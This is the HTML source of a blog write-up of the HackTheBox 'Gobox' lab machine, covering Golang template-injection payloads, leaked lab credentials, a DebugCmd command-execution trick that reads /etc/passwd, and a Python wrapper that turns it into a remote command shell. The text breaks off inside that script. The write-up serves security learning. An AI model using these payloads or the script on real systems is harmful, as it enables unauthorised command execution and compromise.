<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Gobox | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="SSTI in Golang, abuse S3 bucket, and NGINX backdoor"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/gobox/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Gobox"><meta property="og:description" content="SSTI in Golang, abuse S3 bucket, and NGINX backdoor"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/gobox/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/gobox/imgs/image-20210909130128535.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-09-12T12:33:46+07:00"><meta property="article:modified_time" content="2021-09-12T12:33:46+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/gobox/imgs/image-20210909130128535.png"><meta name=twitter:title content="HackTheBox - Gobox"><meta name=twitter:description content="SSTI in Golang, abuse S3 bucket, and NGINX backdoor"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Gobox","item":"https://fahmifj.github.io/hackthebox/gobox/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Gobox","name":"HackTheBox - Gobox","description":"SSTI in Golang, abuse S3 bucket, and NGINX backdoor","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Gobox is a machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications, one of which is a Go web application and is vulnerable to SSTI. The SSTI can be exploited to leak credentials and these can be used to login into the web app. After logging in, the app provides its source code. The source code reveals a debug mode that allows code execution to the underlying system, which is a container. Enumeration within the container reveals that it can interact with simulated Amazon S3 and has write permission on a bucket, thus allows me to drop a web shell to gain a foothold on the host system. Further enumeration on the host reveals an NGINX backdoor which can be leveraged to escalate to root.\nIn the explore section, I’m (trying to) digging into the request routing of this machine.\nSkills Learned Web enumeration Golang SSTI Source Code Analysis Scripting Tools Nmap Burp Suite Reconnaissance Nmap Full TCP scan using nmap discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.\n→ kali@kali «gobox» «10.10.14.97» $ fscan 10.10.11.113 gobox nmap -n -p- --min-rate=10000 10.10.11.113 | grep '^[0-9]' | cut -d '/' -f1 | tr '\\n' ',' | sed 's/,$//' nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 21:30 EDT Nmap scan report for 10.10.11.113 Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http nginx |_http-title: Hacking eSports | {{.Title}} 8080/tcp open http nginx |_http-open-proxy: Proxy might be redirecting requests |_http-title: Hacking eSports | Home page Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.82 seconds Enumeration TCP 80 - Website (Homepage) The site on port 80 is a Hacking eSports homepage.\nOn the address bar, I added index.php and it returned the same page, therefore I can assume it’s a PHP site. But, on the title, I noticed a templating syntax that similar to the one used in Golang, so it’s weird for me to see that syntax on PHP (I’m familiar with that syntax because this blog is based on Go).\nNothing else to see here.\nTCP 8080 - Website (Login page) On port 8080, it presents a login page. When an email and a password is submitted, it outputs nothing.\nPoking with curl shows that it has extra HTTP header: X-Forwarded-Server: golang.\n→ kali@kali «gobox» «10.10.14.97» $ curl -s -I http://10.10.11.113:8080 HTTP/1.1 200 OK Server: nginx Date: Tue, 07 Sep 2021 01:38:34 GMT Connection: keep-alive X-Forwarded-Server: golang The “Forgot Password” link points to /forgot and it’s a password reset feature. If I submit an email address there, for example admin@gobox.htb, it reflects the address under the input box.\nThe following is how the HTTP request and the HTTP response look like.\nFoothold Container root SSTI Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across this post. Using that post as reference and assuming that I can access a struct that has email property, I send the following payload:\nemail={{.Email}} And in the response there is an email address: ippsec@hacking.esports which means the site is vulnerable to SSTI!\nWhen {{.}} is submitted, it spits out all the available property values.\nippsec@hacking.esports and ippsSecretPassword can be used to login, and the page returns with a source code written in Go.\nRCE Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called test and passes it to the exec.Command function.\n... func (u User) DebugCmd(test string) string { ipp := strings.Split(test, \" \") bin := strings.Join(ipp[:1], \" \") args := strings.Join(ipp[1:], \" \") if len(args) \u003e 0 { out, _ := exec.Command(bin, args).CombinedOutput() return string(out) } else { out, _ := exec.Command(bin).CombinedOutput() return string(out) } } ... Because it is a method of struct User, and this struct is rendered by the template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments ({{.DebugCmd \"command\"}} or {{.DebugCmd \"command args\"}}). For example, {{.DebugCmd \"cat /etc/passwd\"}}.\nThe user is root, but I found out that I’m inside a Docker container.\nBased on the documentation, package html/template has autoescaping feature, so my bash reverse shell won’t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.\nimport requests import sys import cmd import html from bs4 import BeautifulSoup # hacky curly braces curly_op = \"{{\" curly_cl = \"}}\" def exploit(url, cmd): payload = {'email': f'{curly_op} .DebugCmd \"{cmd}\" {curly_cl}'} resp = requests.post(url, data=payload) soup = BeautifulSoup(resp.text, features=\"lxml\") output = [tag.text for tag in soup.find_all(\"form\")][0] print(html.unescape((str(str(output).strip().split(\"Email Sent To:\")[1]).split(\"Login\")[0]).strip())) class GoboxSSTI(cmd.Cmd): prompt = '\u003e ' def default(self, line): exploit(url, line) if __name__ == '__main__': try: url = sys.argv[1] except IndexError: sys.exit(-1) term = GoboxSSTI() try:\tterm.cmdloop() except KeyboardInterrupt: sys.exit(-1) Using that wrapper, I have ability to send OS command from my CLI to the compromised container.\n→ kali@kali «exploits» «10.10.14.97» $ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/ \u003e id uid=0(root) gid=0(root) groups=0(root) \u003e uname -a Linux aws 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Shell as www-data S3 enumeration While I was enumerating the installed binary to get a foothold on the container, I found an aws binary.\n\u003e ls -l /usr/bin/aws -rwxr-xr-x 1 root root 815 Jun 17 2020 /usr/bin/aws \u003e aws usage: aws [options] [ ...] [parameters] To see help text, you can run: aws help aws help aws help aws: error: the following arguments are required: command I will send aws s3 ls to list the available buckets and there is one called website.\n\u003e aws s3 ls 2021-09-07 07:32:42 website The bucket contains 4 files.\n\u003e aws s3 ls website PRE css/ 2021-09-07 07:32:42 1294778 bottom.png 2021-09-07 07:32:42 165551 header.png 2021-09-07 07:32:42 5 index.html 2021-09-07 07:32:42 1803 index.php When I read the contents of index.php file, I’m sure it’s the source code of the homepage (port 80).\n\u003e aws s3 cp s3://website/index.php /tmp/id.php download: s3://website/index.php to ../../tmp/id.php) remaining \u003e cat /tmp/id.php \u003c!DOCTYPE html\u003e ","wordCount":"3145","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/gobox/imgs/image-20210909130128535.png","datePublished":"2021-09-12T12:33:46+07:00","dateModified":"2021-09-12T12:33:46+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/gobox/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Gobox</h1><p class=post-description>SSTI in Golang, abuse S3 bucket, and NGINX backdoor</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>September 12, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>15 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website-homepage aria-label="TCP 80 - Website (Homepage)">TCP 80 - Website (Homepage)</a></li><li><a href=#tcp-8080---website-login-page aria-label="TCP 8080 - Website (Login page)">TCP 8080 - Website (Login page)</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#container-root aria-label="Container root">Container root</a></li><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li><li><a href=#explore aria-label=Explore>Explore</a><ul><li><a href=#undetected-ports aria-label="Undetected ports">Undetected ports</a></li><li><a href=#gobox-request-routing aria-label="Gobox Request Routing">Gobox Request Routing</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/gobox/imgs/image-20210909130128535_hu3e0117264ad9859c615a3a371e157bff_151554_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/gobox/imgs/image-20210909130128535_hu3e0117264ad9859c615a3a371e157bff_151554_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/gobox/imgs/image-20210909130128535_hu3e0117264ad9859c615a3a371e157bff_151554_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/gobox/imgs/image-20210909130128535.png 733w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/gobox/imgs/image-20210909130128535.png alt width=733 height=469></figure><p>Gobox is a machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications, one of which is a Go web application and is vulnerable to SSTI. The SSTI can be exploited to leak credentials and these can be used to login into the web app. After logging in, the app provides its source code. The source code reveals a debug mode that allows code execution to the underlying system, which is a container. Enumeration within the container reveals that it can interact with simulated Amazon S3 and has write permission on a bucket, thus allows me to drop a web shell to gain a foothold on the host system. Further enumeration on the host reveals an NGINX backdoor which can be leveraged to escalate to root.</p><p>In the explore section, I&rsquo;m (trying to) digging into the request routing of this machine.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Web enumeration</li><li>Golang SSTI</li><li>Source Code Analysis</li><li>Scripting</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Burp Suite</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «gobox» «10.10.14.97»
</span></span><span class=line><span class=cl>$ fscan 10.10.11.113 gobox
</span></span><span class=line><span class=cl>nmap -n -p- --min-rate<span class=o>=</span><span class=m>10000</span> 10.10.11.113 <span class=p>|</span> grep <span class=s1>&#39;^[0-9]&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f1 <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/,$//&#39;</span>
</span></span><span class=line><span class=cl>nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-09-06 21:30 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.113
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.18s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http    nginx
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Hacking eSports <span class=p>|</span> <span class=o>{{</span>.Title<span class=o>}}</span>
</span></span><span class=line><span class=cl>8080/tcp open  http    nginx
</span></span><span class=line><span class=cl><span class=p>|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Hacking eSports <span class=p>|</span> Home page
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 30.82 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website-homepage>TCP 80 - Website (Homepage)<a class=anchor aria-hidden=true href=#tcp-80---website-homepage>#</a></h3><p>The site on port 80 is a Hacking eSports homepage.</p><p><div class=img-container><img src=imgs/image-20210908091359759.png alt=image-20210908091359759></div></p><p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax that similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP (I&rsquo;m familiar with that syntax because this blog is based on Go).</p><p><div class=img-container><img src=imgs/image-20210908102851854.png alt=image-20210908102851854></div></p><p>Nothing else to see here.</p><h3 id=tcp-8080---website-login-page>TCP 8080 - Website (Login page)<a class=anchor aria-hidden=true href=#tcp-8080---website-login-page>#</a></h3><p>On port 8080, it presents a login page. When an email and a password is submitted, it outputs nothing.</p><p><div class=img-container><img src=imgs/image-20210907083526935.png alt=image-20210907083526935></div></p><p>Poking with <code>curl</code> shows that it has extra HTTP header: <code>X-Forwarded-Server: golang</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «gobox» «10.10.14.97» 
</span></span><span class=line><span class=cl>$ curl -s -I http://10.10.11.113:8080       
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Server: nginx
</span></span><span class=line><span class=cl>Date: Tue, <span class=m>07</span> Sep <span class=m>2021</span> 01:38:34 GMT
</span></span><span class=line><span class=cl>Connection: keep-alive
</span></span><span class=line><span class=cl>X-Forwarded-Server: golang
</span></span></code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p><p><div class=img-container><img src=imgs/image-20210907084427125.png alt=image-20210907084427125></div></p><p>The following is how the HTTP request and the HTTP response look like.</p><p><div class=img-container><img src=imgs/image-20210907090528507.png alt=image-20210907090528507></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=container-root>Container root<a class=anchor aria-hidden=true href=#container-root>#</a></h3><h4 id=ssti>SSTI<a class=anchor aria-hidden=true href=#ssti>#</a></h4><p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href=https://www.onsecurity.io/blog/go-ssti-method-research/>this post</a>. Using that post as reference and assuming that I can access a <a href=https://tour.golang.org/moretypes/2>struct</a> that has email property, I send the following payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>email={{.Email}}
</span></span></code></pre></div><p>And in the response there is an email address: <code>ippsec@hacking.esports</code> which means the site is vulnerable to SSTI!</p><p><div class=img-container><img src=imgs/image-20210907090719892.png alt=image-20210907090719892></div></p><p>When <code>{{.}}</code> is submitted, it spits out all the available property values.</p><p><div class=img-container><img src=imgs/image-20210907090804596.png alt=image-20210907090804596></div></p><p><code>ippsec@hacking.esports</code> and <code>ippsSecretPassword</code> can be used to login, and the page returns with a source code written in Go.</p><p><div class=img-container><img src=imgs/image-20210907091141912.png alt=image-20210907091141912></div></p><h4 id=rce>RCE<a class=anchor aria-hidden=true href=#rce>#</a></h4><p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and passes it to the <code>exec.Command</code> function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=p>(</span><span class=nx>u</span> <span class=nx>User</span><span class=p>)</span> <span class=nf>DebugCmd</span><span class=p>(</span><span class=nx>test</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>string</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>ipp</span> <span class=o>:=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Split</span><span class=p>(</span><span class=nx>test</span><span class=p>,</span> <span class=s>&#34; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>bin</span> <span class=o>:=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Join</span><span class=p>(</span><span class=nx>ipp</span><span class=p>[:</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>args</span> <span class=o>:=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Join</span><span class=p>(</span><span class=nx>ipp</span><span class=p>[</span><span class=mi>1</span><span class=p>:],</span> <span class=s>&#34; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>args</span><span class=p>)</span> <span class=p>&gt;</span> <span class=mi>0</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>out</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span><span class=nx>bin</span><span class=p>,</span> <span class=nx>args</span><span class=p>).</span><span class=nf>CombinedOutput</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nb>string</span><span class=p>(</span><span class=nx>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>out</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span><span class=nx>bin</span><span class=p>).</span><span class=nf>CombinedOutput</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nb>string</span><span class=p>(</span><span class=nx>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by the template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd "command"}}</code> or <code>{{.DebugCmd "command args"}}</code>). For example, <code>{{.DebugCmd "cat /etc/passwd"}}</code>.</p><p><div class=img-container><img src=imgs/image-20210907093537225.png alt=image-20210907093537225></div></p><p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p><p><div class=img-container><img src=imgs/image-20210907095803677.png alt=image-20210907095803677></div></p><p>Based on <a href=https://pkg.go.dev/html/template>the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cmd</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>html</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># hacky curly braces</span>
</span></span><span class=line><span class=cl><span class=n>curly_op</span> <span class=o>=</span> <span class=s2>&#34;{{&#34;</span>
</span></span><span class=line><span class=cl><span class=n>curly_cl</span> <span class=o>=</span> <span class=s2>&#34;}}&#34;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span>  <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;email&#39;</span><span class=p>:</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>curly_op</span><span class=si>}</span><span class=s1> .DebugCmd &#34;</span><span class=si>{</span><span class=n>cmd</span><span class=si>}</span><span class=s1>&#34; </span><span class=si>{</span><span class=n>curly_cl</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=n>resp</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>soup</span> <span class=o>=</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>features</span><span class=o>=</span><span class=s2>&#34;lxml&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>output</span> <span class=o>=</span> <span class=p>[</span><span class=n>tag</span><span class=o>.</span><span class=n>text</span> <span class=k>for</span> <span class=n>tag</span> <span class=ow>in</span> <span class=n>soup</span><span class=o>.</span><span class=n>find_all</span><span class=p>(</span><span class=s2>&#34;form&#34;</span><span class=p>)][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=n>html</span><span class=o>.</span><span class=n>unescape</span><span class=p>((</span><span class=nb>str</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>output</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;Email Sent To:&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;Login&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span><span class=o>.</span><span class=n>strip</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>GoboxSSTI</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>Cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>prompt</span> <span class=o>=</span> <span class=s1>&#39;&gt; &#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>def</span> <span class=nf>default</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>line</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>exploit</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
